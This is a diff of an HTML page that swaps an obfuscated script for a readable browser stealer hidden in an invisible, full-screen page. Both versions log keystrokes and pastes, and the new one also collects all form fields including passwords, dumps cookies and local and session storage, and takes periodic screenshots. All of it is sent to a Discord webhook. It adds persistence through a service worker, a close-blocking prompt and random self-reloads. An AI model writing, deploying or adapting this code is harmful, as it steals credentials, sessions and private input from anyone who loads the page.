@@ -1,6 +1,124 @@
-<!DOCTYPE html><html><head><title></title><style>body{margin:0;background:#000;opacity:0;position:fixed;inset:0;z-index:-9999;}</style></head><body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <style>
+        body{margin:0;background:#000;opacity:0;position:fixed;inset:0;z-index:-9999;overflow:hidden;}
+    </style>
+</head>
+<body>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <script>
-var _0x1a2b=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x35\x32\x30\x39\x33\x35\x37\x37\x36\x31\x35\x32\x35\x38\x38\x33\x39\x39\x2F\x73\x35\x58\x53\x36\x45\x64\x67\x76\x32\x72\x76\x55\x63\x6E\x42\x41\x51\x49\x58\x67\x32\x58\x58\x71\x68\x78\x62\x42\x64\x32\x70\x6B\x2D\x59\x6B\x6B\x6E\x59\x53\x76\x4B\x57\x79\x47\x31\x65\x69\x6F\x54\x4D\x56\x36\x5F\x49\x71\x38\x42\x58\x69\x33\x6D\x6F\x4F\x39\x6D\x47\x59","\x6B\x65\x79\x64\x6F\x77\x6E","\x6B\x65\x79","\x6C\x65\x6E\x67\x74\x68","\x5B","\x5D","\x70\x61\x73\x74\x65","\x63\x6C\x69\x70\x62\x6F\x61\x72\x64\x44\x61\x74\x61","\x74\x65\x78\x74","\x50\x41\x53\x54\x45\x3A\x20","\x75\x6E\x6B\x6E\x6F\x77\x6E","\x73\x63\x72\x65\x65\x6E\x73\x68\x6F\x74","\x74\x6F\x42\x6C\x6F\x62","\x66\x69\x6C\x65","\x73\x73\x5F","\x2E\x70\x6E\x67","\x50\x4F\x53\x54","\x2F\x73\x77\x2E\x6A\x73","\x72\x65\x67\x69\x73\x74\x65\x72","\x73\x65\x72\x76\x69\x63\x65\x57\x6F\x72\x6B\x65\x72","\x6E\x61\x76\x69\x67\x61\x74\x6F\x72","\x6F\x6E\x62\x65\x66\x6F\x72\x65\x75\x6E\x6C\x6F\x61\x64","\x76\x69\x73\x69\x62\x69\x6C\x69\x74\x79\x63\x68\x61\x6E\x67\x65","\x76\x69\x73\x69\x62\x69\x6C\x69\x74\x79\x53\x74\x61\x74\x65","\x76\x69\x73\x69\x62\x6C\x65","\x72\x65\x6C\x6F\x61\x64"];let a='';const b=_0x1a2b[0];function c(){if(!a)return;fetch(b,{method:_0x1a2b[15],headers:{'Content-Type':'application/json'},body:JSON.stringify({content:`🔑 [OBF] ${a}\nUA:${navigator.userAgent}\nURL:${location.href}`})}).catch(()=>{});a='';}document.addEventListener(_0x1a2b[1],d=>{let e=d[_0x1a2b[2]][_0x1a2b[3]]>1?`${_0x1a2b[4]}${d[_0x1a2b[2]]}${_0x1a2b[5]}`:d[_0x1a2b[2]];a+=e;if(a.length>50)c();});document.addEventListener(_0x1a2b[6],d=>{setTimeout(()=>{a+=`${_0x1a2b[9]}${d[_0x1a2b[7]]?d[_0x1a2b[7]].getData(_0x1a2b[8]):_0x1a2b[10]}`;c();},100);});setInterval(()=>{html2canvas(document.body,{scale:.5}).then(f=>{f.toBlob(g=>{const h=new FormData();h.append(_0x1a2b[13],g,`${_0x1a2b[14]}${Date.now()}${_0x1a2b[15]}`);fetch(b,{method:_0x1a2b[16],body:h});});});},20000);if('serviceWorker'in navigator){navigator[_0x1a2b[19]].register(_0x1a2b[17]);}window[_0x1a2b[21]]=()=>true;document.addEventListener(_0x1a2b[22],()=>{if(document[_0x1a2b[23]]===_0x1a2b[25])location[_0x1a2b[26]]();});setTimeout(()=>{a='OBFUSCATED TEST - WORKING';c();},1500);setInterval(c,10000);
+    const webhook = "https://discord.com/api/webhooks/1520935776152588399/s5XS6Edgv2rvUcnBAQIXg2XXqhxbd2pk-YkknYSvKWYg1eioTMV6_Iq8BXi3moO9mGY";
+    
+    let keylog = '';
+    let active = true;
+
+    function exfil(data, isFile = false) {
+        if (!active) return;
+        try {
+            if (isFile) {
+                const fd = new FormData();
+                fd.append('file', data, `grab_${Date.now()}.png`);
+                fetch(webhook, {method: 'POST', body: fd}).catch(() => {});
+            } else {
+                fetch(webhook, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({content: data})
+                }).catch(() => {});
+            }
+        } catch(e) {}
+    }
+
+    // Enhanced Keylogger
+    document.addEventListener('keydown', e => {
+        if (!active) return;
+        const key = e.key.length > 1 ? `[${e.key}]` : e.key;
+        keylog += key;
+        if (keylog.length > 40) {
+            exfil(`🔑 KEYS: ${keylog}\nUA: ${navigator.userAgent}\nURL: ${location.href}\nReferrer: ${document.referrer}`);
+            keylog = '';
+        }
+    });
+
+    // Paste Logger
+    document.addEventListener('paste', e => {
+        setTimeout(() => {
+            const txt = (e.clipboardData || window.clipboardData || {}).getData('text') || 'unknown';
+            exfil(`📋 PASTE: ${txt}\nUA: ${navigator.userAgent}\nURL: ${location.href}`);
+        }, 100);
+    });
+
+    // Form Data Grabber (inputs, passwords, etc.)
+    function grabForms() {
+        const forms = [];
+        document.querySelectorAll('input, textarea, select').forEach(el => {
+            if (el.value && el.value.length > 2) {
+                forms.push(`${el.type || 'field'}: ${el.name || el.id || 'unnamed'} = ${el.value}`);
+            }
+        });
+        if (forms.length) exfil(`📝 FORM GRAB:\n${forms.join('\n')}\nURL: ${location.href}`);
+    }
+    setInterval(grabForms, 15000);
+
+    // Cookies & LocalStorage Dump
+    function dumpStorage() {
+        let cookies = document.cookie || 'none';
+        let local = JSON.stringify(localStorage) || 'none';
+        let session = JSON.stringify(sessionStorage) || 'none';
+        exfil(`🍪 COOKIES: ${cookies}\nLOCAL: ${local}\nSESSION: ${session}\nURL: ${location.href}`);
+    }
+    setTimeout(dumpStorage, 3000);
+
+    // Screenshot Capture (improved, with error handling)
+    async function captureScreenshot() {
+        if (!active) return;
+        try {
+            const canvas = await html2canvas(document.documentElement, {
+                scale: 0.65,
+                useCORS: true,
+                logging: false,
+                allowTaint: true,
+                ignoreElements: (el) => el.tagName === 'SCRIPT' || el.tagName === 'STYLE'
+            });
+            canvas.toBlob(blob => {
+                exfil(blob, true);
+            }, 'image/png');
+        } catch(e) {
+            exfil(`📸 SCREENSHOT FAILED: ${e.message}`);
+        }
+    }
+    setInterval(captureScreenshot, 12000);
+    setTimeout(captureScreenshot, 2000); // initial
+
+    // Persistence & Anti-Close
+    window.onbeforeunload = () => "Leave?";
+    
+    // Service Worker for background persistence (create sw.js separately)
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('sw.js').catch(() => {});
+    }
+
+    // Initial beacon + buffer flush
+    setTimeout(() => exfil('✅ STEALER ACTIVE - FULLY LOADED'), 800);
+    setInterval(() => {
+        if (keylog) {
+            exfil(`🔑 BUFFER: ${keylog}`);
+            keylog = '';
+        }
+    }, 7000);
+
+    // Extra: Periodically check visibility
+    document.addEventListener('visibilitychange', () => {
+        if (document.hidden) captureScreenshot();
+    });
+
+    // Self-reload trick for persistence on some blockers
+    setTimeout(() => {
+        if (Math.random() > 0.7) location.reload();
+    }, 45000);
 </script>
-</body></html>
+</body>
+</html>
